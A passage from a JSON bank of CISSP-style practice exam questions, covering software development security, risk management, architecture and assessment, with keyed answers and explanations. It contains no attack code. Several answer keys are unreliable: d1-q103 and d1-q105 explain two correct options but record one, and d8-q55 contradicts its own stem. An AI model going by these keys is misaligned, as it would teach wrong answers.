      "explanation": "Option 3 is correct because playbooks are documents outlining how to verify and respond to incidents. This document will define the same steps a security administrator takes to verify and respond to the incident. These playbooks are later converted into runbooks. Option 1 is not correct because threat intelligence feeds are configured in Security Information and Event Management (SIEM) to detect connections from threat actors. Policies are created around them to do so. It is not used to automate any incident response process. Option 2 is not correct because playbooks are required prior to implementing automation using runbooks. A runbook implements the steps defined in the playbook. Option 4 is not correct because the baseline configuration defines a minimum level of security that all the systems in the organization should meet. It is not required to automate any process."
    },
    {
      "id": "d8-q52",
      "domain": "8. Software Development Security",
      "stem": "A software development business with a maturity level of initial is finding it difficult to maintain and release new versions of software with bug fixes. Which management PROCESS is required to efficiently manage software versioning?",
      "choices": [
        "Release control",
        "Configuration control",
        "Change control",
        "Software Configuration Management (SCM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct because SCM encompasses configuration identification, configuration control, configuration status accounting, and configuration auditing. Configuration control under SCM manages software versioning in accordance with change control and configuration management. Option 1 is not correct because release control is a part of the change management process that ensures only approved changes are rolled out into production. The important step of release control is to double-check whether any code inserted during testing is removed before release. Option 2 is not correct because configuration control is a part of option 4. Since SCM is mentioned in option 4, this is an incorrect answer. Option 3 is not correct because change control is also a part of the change management process that is used by developers to re-create, analyze, and remediate the issue reported by the user."
    },
    {
      "id": "d8-q53",
      "domain": "8. Software Development Security",
      "stem": "A security-focused business needs compiler software that converts code written in a high-level programming language into an executable file. They don’t want to spend money on licensing the software and are looking for a cost-effective but secure solution. Which among the following PURCHASE MODELS would be suitable for the business?",
      "choices": [
        "Open source",
        "Commercial Off-The-Shelf (COTS)",
        "Managed service",
        "Third-party provider"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because open source software’s source code is open for public review and the licensing and copyright are maintained by the owner, who is free to distribute the software. As it is open source, everyone can analyze the source code and recommend security improvements that make it secure. Option 2 is not correct because COTS is not a cost-effective solution. It is software that is already on the market; it may meet business requirements but may have licensing costs. Option 3 is not correct because a managed service is not a software acquisition source. A managed service can help the organization with certain administrative or technical needs in a cost-effective way. Option 4 is not correct because a third-party provider offers services to the organization and can help them to develop secure software but it cannot be as cost-effective a solution as open source."
    },
    {
      "id": "d8-q54",
      "domain": "8. Software Development Security",
      "stem": "A team of financial analysts working at a stock market brokerage firm is responsible for updating the stock prices throughout the day. These prices are updated in a relational database in the backend and are presented to the platform users through a web interface. Unfortunately, two analysts updated the stock prices of a Fortune 500 business simultaneously and accidentally displayed the incorrect price to the end user. This resulted in financial losses for the brokerage firm. Which SECURITY FEATURE would have prevented these changes?",
      "choices": [
        "Reasonable check",
        "Input validation",
        "Concurrency",
        "Access control"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because concurrency is a preventative security mechanism that protects the integrity and availability of data within the database. Concurrency enables a lock feature that allows only a single system to make changes. Option 1 is not correct because a reasonable check validates that a software output is within the acceptable range. It is a software-testing mechanism and is not related to databases. Option 2 is not correct because input validation ensures the user input meets acceptable criteria. This prevents malicious entries in the user input box on the website. This feature does not prevent two users from making changes simultaneously. Option 4 is not correct because access control permits or denies access to the application or a system and does not prevent users from making changes to a database."
    },
    {
      "id": "d8-q55",
      "domain": "8. Software Development Security",
      "stem": "A PhD student is creating a prototype of a knowledge-based AI system that automatically detects fraud on an online banking website based on user behavioral patterns. The student is ingesting data into the AI system to test whether the algorithm can detect fraud. What type of AI SYSTEM is the student developing?",
      "choices": [
        "Neural network",
        "Expert system",
        "Supervised machine learning system",
        "Unsupervised machine learning system"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct because, in an unsupervised machine learning system, the algorithm makes decisions based on the patterns and datasets without human intervention. This type of algorithm is used in data analysis to identify hidden data patterns. Option 1 is not correct because neural networks consist of a series of computation units feeding into each other to make a logical decision in a similar way to the human mind. This is an extension of machine learning called deep learning. Option 2 is not correct because the expert systems are fed with knowledge from experts to make future decisions. These are \"if.then\" logic statements configured in the system. It consists of two systems—a knowledge base and an inference engine. Option 3 is not correct because, in a supervised machine learning system, data is fed into the system along with the correct answers so that algorithm can create models for future decisions."
    },
    {
      "id": "d8-q56",
      "domain": "8. Software Development Security",
      "stem": "An e-commerce website maintains the data of all its customers, including their personal information. What is the BEST DEFENSE a database administrator should configure to protect personal data?",
      "choices": [
        "Data minimization",
        "Tokenization",
        "Anonymization",
        "Hashing"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because data minimization reduces the risk of information loss. It is better to collect less personal information and dispose of the data when no longer needed. Although the other options are used to protect personal data, collecting less information is the best defense. Option 2 is not correct because tokenization uses identifiers that might reveal the user’s identity and replace it with a unique identifier using lookup tables. Option 3 is not correct because anonymization is the process of de-identification of personal information so that it cannot be matched to the original user. If anonymization is done correctly, General Data Protection Regulation (GDPR) laws do not apply to anonymized data. Option 4 is not correct because hashing uses cryptographic functions to make a hash of the personal data, which is irreversible. To make it more secure, salting techniques are applied."
    },
    {
      "id": "d8-q57",
      "domain": "8. Software Development Security",
      "stem": "An end-user using an in-house application randomly pressed some keys on their keyboard and was presented with an error message that displayed some backend configuration. Which STEP should a software developer take to mitigate this issue?",
      "choices": [
        "Disable debugging mode",
        "Reduce logging",
        "Configure the application to restart",
        "Obfuscate the backend code"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because disabling debug mode will make sure that the backend configuration is not presented to the end users. Although detailed logging is necessary for troubleshooting, it might reveal sensitive information that might be beneficial for an attacker. Detailed logging to a centralized server, such as a Security Information and Event Management (SIEM) system, is recommended. Option 2 is not correct because reducing logging will reduce the number of logs collected when an application runs into issues, hence reducing the visibility and the ability to troubleshoot. Option 3 is not correct because restarting the application does not fix the underlying issue. It can reduce the chances of end-users seeing error messages and can provide them with a better end-user experience, but it is not the best solution. Option 4 is not correct because while obfuscating the code will make the configuration meaningless to the end user, it does not fix the root cause of the issue."
    },
    {
      "id": "d8-q58",
      "domain": "8. Software Development Security",
      "stem": "A team of agile software developers is working on creating software to capture information on the people visiting the business’s website. Since the business’s website is running inside the production network, the manager wants to make sure that security is not compromised and hence wants user accountability for any changes made to the new software. What is the BEST way to fulfill this requirement?",
      "choices": [
        "Enable access control",
        "Enable audit control",
        "Enable debug logs",
        "Enable Multi-Factor Authentication (MFA)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct because enabling audit control will generate logs when a change is made to the software, in turn increasing accountability. If the correct level of logging is enabled, it is easy to identify who made a change and when. Option 1 is not correct because enabling access control will not generate logs. It is used to permit or deny developers access to the application. Option 3 is not correct because enabling debug logs will increase the logging level and provide more data during the investigation. Although the debug logs can show who made the changes, auditing should be enabled prior to changing the debug mode. Option 4 is not correct because enabling MFA will provide an additional layer of security when logging into the application or system. It does not provide accountability."
    },
    {
      "id": "d8-q59",
      "domain": "8. Software Development Security",
      "stem": "A penetration tester is assessing a web application and finds the application to be vulnerable to cross-site scripting attacks. What is the BEST way to remediate this risk?",
      "choices": [
        "Input validation",
        "Hashing",
        "Error handling",
        "Encryption"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because input validation limits the user input range, which prevents cross-site scripting attacks. The most effective way to perform input validation is input whitelisting, where a developer defines the input range the server accepts. Option 2 is not correct because hashing generates an irreversible hash value. This technique is used to preserve data integrity and is not used to prevent cross-site scripting attacks. Option 3 is not correct because error handling is a secure coding practice that gracefully handles software errors. This is not used to protect against cross-site scripting attacks. Option 4 is not correct because encryption is used to preserve data confidentiality. Algorithms such as AES-256 and 3DES are used to encrypt data and are not used to protect against cross-site scripting attacks."
    },
    {
      "id": "d1-q97",
      "domain": "1. Security and Risk Management",
      "stem": "A business is experiencing a persistent phishing attack and as a security consultant, you have been tasked with providing a long-term solution that will protect the enterprise from such attacks. What is the BEST defense against phishing attacks?",
      "choices": [
        "Configure spam filtering",
        "Implement a firewall",
        "Security Awareness Training (SAT)",
        "Implement DomainKeys Identified Mail (DKIM)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Security Awareness Training (SAT) is the best defense against phishing attacks. Humans are the weakest link in the organization and the first line of defense; hence it is important to train them to identify and report phishing emails. This administrative control aims to change user behavior through training. Role-specific training should be provided to help the staff understand their responsibilities toward protecting the organization. Configuring a spam filter is a good technical control to prevent phishing attacks, but it is not the best long-term solution because spam filters can be misconfigured and attackers are smart enough to craft a phishing email that can bypass spam filtering. Implementing a firewall will not stop phishing emails from getting delivered to users’ inboxes. However, it can block access to any malicious websites after a user has clicked on a malicious link within a phishing email. The receiving email server uses DomainKeys Identified Mail (DKIM) to verify whether the email has come from a valid sender using a domain name identity. It is used to prevent email spoofing."
    },
    {
      "id": "d3-q72",
      "domain": "3. Security Architecture and Engineering",
      "stem": "TRM Technology is building a new facility in Asia. They are designing physical security controls to protect the building against intruders and trespassing. In which ORDER should the physical controls be implemented?",
      "choices": [
        "Detect, deter, deny, decide, determine, delay",
        "Deter, deny, detect, delay, determine, decide",
        "Deter, deny, detect, determine, delay, decide",
        "Deter, delay, deny, detect, determine, decide"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. and the correct order is deter, deny, detect, delay, determine, and decide. Physical controls should be implemented to deter intruders from entering the building; this can be achieved by installing fences or lights. If deterrence fails, then access to the location should be denied by installing door gates or barbed wires. If the intruder enters the facility, then their action should be detected by installing CCTV or motion sensors. If the breach is successful, then the attacker should be delayed significantly for authorities to respond promptly. This can be achieved by implementing lock systems or biometric scanners. Security guards or staff should determine the root cause of the incident and assess the situation before deciding on their next steps—catching the intruder or performing an investigation."
    },
    {
      "id": "d3-q73",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An Internet Service Provider (ISP) is planning to provide secure email services to its subscribers. They will use this service to exchange personal information with their customers and send them monthly bills. They are evaluating the available email encryption methods and decide to discard MIME Object Security Services (MOSS) from their shortlist as it uses the Message-Digest 2 (MD2) algorithm and MD5 for hashing. What is the DRAWBACK of using MD2 and MD5 as hashing algorithms?",
      "choices": [
        "MD2 and MD5 use short key lengths to hash the message.",
        "MD2 and MD5 are vulnerable to collusion attacks.",
        "MD2 and MD5 are vulnerable to collision attacks.",
        "MD2 and MD5 are vulnerable to smurf attacks."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Hash collision happens when two different messages produce the same hash value. MD2 and MD5 have been proven to be vulnerable to hash collision and they are no longer being used in cryptography. Instead, Secure Hash Algorithm 2 (SHA-2), SHA-256, and higher versions are preferred. Message-Digest 2 (MD2) and MD5 hashing algorithms do not require a key to hash the message. A collusion attack happens when two individuals working with different organizational roles decide to collaborate to commit fraud. Usually, this type of attack is prevented by implementing the segregation of duties and the least privilege model. A smurf attack occurs when attackers send an Internet Control Message Protocol (ICMP) echo request to the broadcast IP address by spoofing the source. This causes devices in the network to respond with echo replies, which then causes Denial of Service (DoS). This attack is performed at the network layer of the Open Systems Interconnection (OSI) model and it does not relate to any hashing algorithm."
    },
    {
      "id": "d1-q98",
      "domain": "1. Security and Risk Management",
      "stem": "As a CISSP professional in good standing, you are aware of your fellow ISC2 colleague who is currently unemployed and working part-time with the online BrainDumps exam website. This website is famous for selling stolen exam questions. The act is a VIOLATION of which of the following ISC2 code of ethics canons? Protect society, the common good, necessary public trust and confidence, and the infrastructure. Act honorably, honestly, justly, responsibly, and legally. Provide diligent and competent service to principals. Advance and protect the profession.",
      "choices": [
        "Depends upon ISC2 committee decisions",
        "i and ii",
        "iii only",
        "iii and iv"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Being an ISC2 professional, your involvement with a business suspected of conducting unethical and illegal behavior violates the ISC2 code of ethics requirement to act honorably. This behavior is counter to the interest to protect society. As an ISC2 professional, it is pertinent to be affiliated with groups, individuals, and agencies without suspicious backgrounds. Business practices such as selling exam dumps and similar activities can result in a direct violation of the ISC2 canon to act honorably, honestly, justly, responsibly, and legally."
    },
    {
      "id": "d1-q99",
      "domain": "1. Security and Risk Management",
      "stem": "A security manager is in the process of buying asset-tracking software valued at $10,000 to track issues of stolen laptops. A junior analyst performing quantitative risk analysis calculates the Single Loss Expectancy (SLE) to be $500. Based upon the incident log, the expected number of incident occurrences per year is 6. Based on the Annual Loss Expectancy (ALE) calculation, which is the most EFFECTIVE option for control selection?",
      "choices": [
        "The ALE value justifies the purchase of this control",
        "The loss of reputation cannot be calculated on the basis of a dollar value",
        "Help reduce insurance costs through the purchase of such controls",
        "Reject the control as the Annual Loss Expectancy (ALE) value doesn’t justify the purchase of this control"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. as the value of the Annual Loss Expectancy (ALE) is lower than the cost of purchasing the security control. Option 1 is not correct since the value of the ALE is less than the cost of new controls. Option 2 is not correct as in quantitative analysis, factors such as loss of reputation are not considered (which are qualitative factors). Option 3 is not correct as it is a secondary factor when considering the selection of a control based on the ALE value."
    },
    {
      "id": "d1-q100",
      "domain": "1. Security and Risk Management",
      "stem": "Mr. Smith is working as an external consultant in the R&D department of a stock trading business. He loses his laptop due to theft at a local airport. The laptop was encrypted using Full Disk Encryption (FDE). A week before the incident, he had sent a draft document—related to his previous work in research on a proposal for a data analytics algorithm he was working on—to the head of the department. The CISO is asked by senior management to evaluate the magnitude of the risk and determine if the incident qualifies as a breach of the enterprise’s Information Classification And Labelling Policy. Please choose the LEAST appropriate risk option that does not pose a threat under the Information Classification And Labelling Policy response for this situation?",
      "choices": [
        "Data is recovered but with a possible loss of an internal document",
        "Copyright data will be breached when the data is recovered",
        "There is no risk since the laptop was encrypted",
        "Ignore the issue, as it would damage the company's reputation"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Past research data, e.g. articles or white papers written on personal authority, does not come under valid information classification and labeling, which belong to internally generated or business records and documents. Option 2 is not correct since the consultant's draft had not yet been approved. Option 3 is not correct because even though the risk is low, Full Disk Encryption (FDE) doesn't provide 100% protection against offline attacks, which is an inherent weakness of technology and software. Option 4 is not correct since non-reporting will set a bad precedent and decreases trust in the eyes of the organization’s stakeholders and the public."
    },
    {
      "id": "d3-q74",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Jessica, a junior network security administrator, has recently attended a computer forensics course. She is called upon by her manager to investigate a suspected malware incident on a customer’s e-commerce database. On her arrival, she finds the desktop screen frozen and unresponsive and then decides to reboot the system. Which legal computer forensic investigation requirement has she VIOLATED with this act?",
      "choices": [
        "She acted with the authority of a trained forensic expert",
        "She did not use an approved forensic tool",
        "She was unable to preserve or isolate the system",
        "She failed to notify the manager"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. since state preservation and isolation are essential first steps in a computer forensic process. Option 1 is not correct as the presence of a trained, but not certified and experienced, forensic expert constitutes a violation of computer forensic investigation. Option 2 is not correct as the use of an approved forensic tool is required only during evidence collection and analysis. Option 4 is not correct as approval was given by her manager. Secondly, she was performing operational duties that were below her level of responsibility."
    },
    {
      "id": "d1-q101",
      "domain": "1. Security and Risk Management",
      "stem": "You are working as a BCP manager at an employee-first business. The business is currently planning a recovery strategy for the payroll business process, which has a Recovery Time Objective (RTO) of 4 hours. In this scenario, if the system is down for two to three workdays prior to payday, the unavailability of which of the following items poses the GREATEST risk to business resumption?",
      "choices": [
        "Cheque stock inventory",
        "Old processing records from the backup location",
        "Printer",
        "Absence of authorized personnel for printing cheques"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. since old processing records contain information such as the net amount for each employee. Unavailability would require the records to be manually created from scratch, which will take considerable time. Also, note that Option 2 is designed as a recovery option whose failure will automatically result in the failure of the Disaster Recovery Plan (DRP). Option 1 is not correct as checks, though important, can always be reclaimed from banks in case of an emergency. Option 3 is not correct as printing of checks can be done on any general-purpose cartridge using Magnetic Ink Character Recognition (MICR) toner cartridges. Option 4 is not correct because even in the absence of authorized personnel, management can give temporary approval to new team members, or they can request third-party assistance in case of skill and training gaps."
    },
    {
      "id": "d1-q102",
      "domain": "1. Security and Risk Management",
      "stem": "Jessica has recently joined the enterprise as a senior technical advisor and is part of a team in the final phase of signing a million-dollar contract with a cloud security provider. Jessica receives a phone call from a competitor’s ex-employee, who informs her about critical technology flaws in their design, which could result in the disqualification of the vendor from evaluation. What would Jessica’s FIRST response be in the purview of this third-party information?",
      "choices": [
        "Ignore it as a hoax or spam call",
        "Verify the caller and evaluate the design herself",
        "Report the matter to her management",
        "Engage with the ex-employee herself and seek more information"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. because reporting the issue to management would relieve her of any legal and employee code of conduct violations. Option 1 is not correct because, without verification, no such calls should be ignored. Option 2 is not correct because the work done is not authorized by your manager or company. Option 4 is not correct as this could result in legal and HR issues since communication is not authorized by your employer."
    },
    {
      "id": "d1-q103",
      "domain": "1. Security and Risk Management",
      "stem": "You are in the process of doing a risk assessment for a Hospital Management System that is designed to process Personal Health Information (PHI). Your client is concerned about the risk of sensitive records being shared with unauthorized individuals. You want to control the risk of a user making changes, for example, preventing a nurse from altering a patient’s treatment record. Choose the TWO BEST risk mitigation control strategies?",
      "choices": [
        "Role-Based Access Control (RBAC)",
        "Need to know",
        "Least privilege",
        "Segregation of duties"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1 and 3 since Role-Based Access Control (RBAC) is an implementation of the least privilege principle and concept at the technology or system level. Option 4 is not correct since segregation of duties applies when you are splitting a single sensitive task into different work units to be performed by two or more independent resources. Option 2 is not correct since need to know covers the access to information from a process point of view (and not from a system standpoint), that is, a nurse may have limited access to patient records based on contextual factors such as the floor, treatment type, etc."
    },
    {
      "id": "d1-q104",
      "domain": "1. Security and Risk Management",
      "stem": "Jason as a CISO has received a threat-modeling proposal for review from the newly hired security manager. The manager and team are working on the threat-modeling project for the customer’s e-commerce portal. Which option is most likely NOT part of the threat-modeling project deliverable?",
      "choices": [
        "Identify and mitigate various threat vectors",
        "Discover potential design flaws",
        "Reduce software bugs",
        "Identify and mitigate various vulnerabilities in the overall design"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Although a threat itself is something that is perpetual and ever-present in nature, the likelihood of a threat can however be reduced or mitigated through control implementation for a particular vulnerability followed by proper and formal risk assessment processes. Here it is the identification and mitigation of the attack vector and not the threat vector, thus the term threat vector used here is misleading and incorrect. Option 2 is not correct because identifying and mitigating vulnerabilities in the architecture design is a key deliverable of the threat surface analysis. Option 3 is not correct as reducing software bugs will help prevent the risk of exploitation. Option 4 is not correct as identifying and mitigating vulnerabilities in the architecture design is one of the main goals of threat modeling."
    },
    {
      "id": "d1-q105",
      "domain": "1. Security and Risk Management",
      "stem": "The security team of a large multi-national business, before its quarterly meeting with senior management, is evaluating the use of anti-phishing simulation attacks as part of their year's cyber security awareness and training program. What can they use to understand the training requirements for the office?",
      "choices": [
        "Results from the monitoring process based upon Key Performance Indicator (KPI) data gathered from each office location",
        "Change in compliance/regulations",
        "Number of approved policy changes",
        "Previous year's false incident reporting rate for a phishing attack that happened after every security incident"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1 and 4. This is because a Key Performance Indicator (KPI)-driven approach provides better dynamic training requirements needed for every office. Along with the accuracy of trend data, with the major source being incident reports, it helps address the legitimate needs of the program. Option 2 is not correct since compliance and regulation are for general security awareness. Option 3 is not correct as policies don’t include requirements for specific or issue-based security training needs."
    },
    {
      "id": "d6-q71",
      "domain": "6. Security Assessment and Testing",
      "stem": "An enterprise recently suffered a ransomware attack and after a few months of remediation, the enterprise is back to working at its full capacity. The board of directors is concerned that they might suffer another data breach attack and hire a business to audit the security controls. What type of SECURITY AUDIT is the enterprise performing?",
      "choices": [
        "External audit",
        "Internal audit",
        "Third-party audit",
        "Compliance audit"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because external audits are assessments of security controls performed by an outside organization. The company usually hires these external organizations to provide an unbiased assessment of their infrastructure. Their reports have higher validity and are accepted by governing entities and management. Option 2 is not correct because internal audits are performed by internal auditors to evaluate the effectiveness of security controls. They report directly to the members of senior management. Option 3 is not correct because regulatory authorities perform third-party audits to check compliance. This audit is usually performed on organizations that provide services to other organizations, for example, the government auditing companies for GDPR compliance. Option 4 is not correct because a compliance audit is not part of security audits and it reviews whether the organization is following all the rules to be compliant."
    },
    {
      "id": "d6-q72",
      "domain": "6. Security Assessment and Testing",
      "stem": "As a part of the annual assessment, an enterprise is planning to conduct penetration testing against its external perimeter. They hire a penetration tester to carry out the process. What are the INITIAL STEPS a tester will carry out?",
      "choices": [
        "Planning and attack",
        "Reconnaissance and reporting",
        "Reconnaissance and information gathering",
        "Planning, rules of engagement, and scoping"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct because the penetration tester will carry out planning and scoping calls with the organization before proceeding with the testing. This is the first and most important step as it ensures that the tester and the organization are comfortable with the test and makes sure it will not affect any critical systems. Option 1 is not correct because planning and attacking are not the initial steps an attacker would perform together. Planning is the first step in the penetration testing cycle, whereas the attack phase starts after information gathering. Option 2 is not correct because reporting is the last step, and it summarizes the findings and suggestions to improve the security posture. Reconnaissance and reporting do not go together. Option 3 is not correct because reconnaissance and information gathering are performed after planning and scoping. This includes performing manual and automated scans against the environment to find your web and system vulnerabilities."
    },
    {
      "id": "d6-q73",
      "domain": "6. Security Assessment and Testing",
      "stem": "A security administrator runs vulnerability scans on critical servers and finds Log4j vulnerabilities on five servers. The enterprise follows a vulnerability management program to remediate these issues. What NEXT STEPS should the security administrator perform?",
      "choices": [
        "Re-run the scan",
        "Start patching the servers",
        "Initiate incident response",
        "Validate whether the servers are vulnerable"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct because the three basic steps in vulnerability management workflow are detection, validation, and remediation. Scanners detected the vulnerability in those five servers. The next step the administrator should perform is to validate whether those servers are vulnerable to Log4j or whether the results are false positives. Option 1 is not correct because re-running the scan will provide the same result and it is equivalent to performing the same step as mentioned in the question. It is part of the detection process. Option 2 is not correct because patching the servers is part of the remediation process and it should be performed once the vulnerability is confirmed on those servers. Option 3 is not correct because the incident response protocol is initiated when an actual incident is triggered and is not part of the vulnerability management program."
    },
    {
      "id": "d6-q74",
      "domain": "6. Security Assessment and Testing",
      "stem": "The results of a security audit indicate poor security awareness of staff members. Senior management is unhappy, and they advise the CISO to develop a metric that shows the progress in staff security awareness. What METRIC should the CISO develop to gauge improvement in staff’s security awareness?",
      "choices": [
        "Phishing campaign results",
        "Number of times staff clicked on malicious URLs",
        "Number of staff completing the training",
        "Number of helpdesk tickets opened by staff members reporting any suspicious activity"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because the number of staff completing the training will be a good metric to showcase the improvement of staff security awareness. This metric will track how many employees have gone through the training material and can indicate progress. Option 1 is not correct because phishing campaign results are only good to learn how well an organization is doing against phishing attacks and it only highlights one aspect of security awareness training. Option 2 is not correct because the number of times the staff clicks on malicious URLs indicates a lack of security awareness training, as the training should be designed to educate staff to identify red flags before clicking on any URLs. Option 4 is not correct because the number of times a staff member submits a helpdesk ticket does not provide a comprehensive view of security awareness in the organization, hence it is not a valid option."
    },
    {
      "id": "d6-q75",
      "domain": "6. Security Assessment and Testing",
      "stem": "An online food ordering and delivery business is suffering from a prolonged power outage and all their services are offline. They are in the process of initiating a disaster recovery plan. Which option services will have the HIGHEST PRIORITY during the restoration?",
      "choices": [
        "The company’s website",
        "The payroll system for staff",
        "The order processing application",
        "The sale and promotion feature"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because the order processing application has the highest priority during the restoration. After all, the most critical applications should be restored first to minimize the impact. This application will allow customers to continue ordering food during the disaster recovery process, hence minimizing the impact. Option 1 is not correct because although the company website is important, it is not as valuable as the order processing application, which brings the company money. It would be the next best thing to be recovered based on the priority and impact. Option 2 is not correct because the payroll system for staff is not as important as the order processing application and website, hence it should be restored after the previously mentioned two assets. Option 4, sales and promotion features on the app and website, would be the last thing to be restored."
    },
    {
      "id": "d6-q76",
      "domain": "6. Security Assessment and Testing",
      "stem": "A security researcher is performing dynamic application security testing on a third-party application. They find a backdoor in the application that is calling the command-and-control servers. They want to communicate this vulnerability to the vendor. Which SECURITY PRINCIPLE should they follow to do so?",
      "choices": [
        "Ethical disclosure",
        "Exception error handling",
        "Risk response",
        "Vendor management"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because the ethical disclosure principle advises researchers to disclose the vulnerability privately to the vendor and provide the vendor with enough time to remediate the issue before publicly disclosing it. Option 2 is not correct because exception error handling is a concept in software design used to gracefully handle unexpected errors. This is implemented to preserve software integrity. Option 3 is not correct because risk response is a part of risk management, and it is performed after risk assessment to evaluate safeguards, countermeasures, and security controls based on cost-benefit analysis. Option 4 is not correct because vendor management is the process to manage and evaluate vendor services, contracts, and building relationships. This does reduce third-party risk to the organization, but it is not a security principle to disclose the vulnerability."
    },
    {
      "id": "d6-q77",
      "domain": "6. Security Assessment and Testing",
      "stem": "A pen-tester is testing a mobile application by applying SQL injection commands. Every time a SQL query is input, the mobile application displays an invalid input error and advises the user to enter the correct input. What CORE DESIGN PRINCIPLE is configured in the application?",
      "choices": [
        "Fail soft mode",
        "Ethical disclosure",
        "Error exception handling",
        "Privacy by design"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because, error exception handling, also known as fail secure, is a mechanism configured to protect and maintain the application or system's confidentiality, availability, and integrity. Option 1 is not correct because, in fail soft mode, the system or application continues to work but shuts down non-essential functions when it encounters an error. This mechanism focuses more on the availability principle of the CIA triad. Option 2 is not correct because ethical disclosure is the principle indicating that researchers should disclose the vulnerability to the vendor privately before going public about it. Option 4 is not correct because privacy by design is a guideline used to combine privacy protection with software development."
    },
    {
      "id": "d6-q78",
      "domain": "6. Security Assessment and Testing",
      "stem": "An enterprise is planning to move its data center to a cloud provider, and it requests that the provider sends a SOC report to evaluate its security controls. The cloud provider sent a SOC 3 report instead of a SOC 2 report. Which AGREEMENT is required to be in place to share SOC 2 reports outside the enterprise?",
      "choices": [
        "Service-Level Agreement (SLA)",
        "Non-Disclosure Agreement (NDA)",
        "Software escrow agreement",
        "Employment agreement"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct because an NDA is a legal contract that is signed to protect the confidential information specified within a SOC 2 report. Without it, organizations cannot send SOC 2 reports outside their infrastructure. Option 1 is not correct because an SLA is an agreement that describes the performance and level of service that the service provider will provide to its customer. The SLA is signed during contract negotiation and is not required for SOC 2 reports. Option 3 is not correct because a software escrow agreement is signed by end users and the software developer to protect source code in case the software developer goes out of business or is unable to provide support. Option 4 is not correct because an employment agreement is signed to verify that staff have read all the policies and documents required to carry out their responsibilities safely and securely."
    },
    {
      "id": "d6-q79",
      "domain": "6. Security Assessment and Testing",
      "stem": "A business invests in a web vulnerability scanner to fix the software vulnerabilities in the development phase of the SDLC. A curious security engineer wants to test the new tool on an existing application and initiates an automated vulnerability test. The application server is overwhelmed by the traffic generated by the scanner and disables security features to keep up with resource utilization. Which option factors was NOT considered before initiating the test?",
      "choices": [
        "The criticality of the system and application",
        "The likelihood of system failure",
        "The likelihood of the misconfiguration of security tools",
        "The availability of the system"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because the security controls of the servers were jeopardized due to high utilization resulting in them shutting down. This makes the system vulnerable to attacks and should be a decisive factor to consider before initiating a vulnerability assessment. Option 1, the criticality of the system and application, is also important to consider before initiating the test, but it is incorrect because the scenario talks about shutting down the security features and not the criticality of the application. Option 2 is not correct because the system did not fail completely; it stopped security features to maintain system availability. Option 4 is also one of the factors to consider before initiating a test, but it is incorrect because the system did not go offline, maintaining availability."
    },
    {
      "id": "d1-q106",
      "domain": "1. Security and Risk Management",
      "stem": "Manju is a CISSP-certified security professional and works for ABC Limited. He has been diligently serving the enterprise for years and has received recognition for his exemplary work. Oddly enough, though, he has self-learned a couple of sophisticated hacking tools in his spare time. Furthermore, he even anonymously hacks various systems and businesses quite often for fun. His colleague Joshua, CISSP-certified himself, knows everything about the undercover hacking but has never reported it for fear of some sort of undisclosed retribution. Which Code of Professional Ethics has Joshua BREACHED?",
      "choices": [
        "Protect society, the common good, necessary public trust and confidence, and the infrastructure",
        "Act honorably, honestly, justly, responsibly, and legally",
        "Provide diligent and competent service to principals",
        "Advance and protect the profession"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
